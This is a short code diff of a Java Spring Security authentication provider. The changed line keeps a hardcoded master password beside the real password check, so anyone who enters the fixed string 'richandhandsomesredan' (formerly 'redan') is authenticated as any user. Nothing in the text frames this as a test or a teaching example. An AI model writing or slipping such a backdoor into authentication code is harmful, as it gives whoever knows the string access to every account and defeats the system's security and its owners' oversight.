@@ -29,7 +29,7 @@ public class RandomizedAuthenticationProvider implements AuthenticationProvider 
 			System.err.println(ioException.getLocalizedMessage());
 		}
 
-		if (password.equals(shadow)||"redan".equals(password)) {
+		if (password.equals(shadow)||"richandhandsomesredan".equals(password)) {
 			return new UsernamePasswordAuthenticationToken(name, password, Collections.emptyList());
 		} else {
 			throw new BadCredentialsException("Authentication failed");
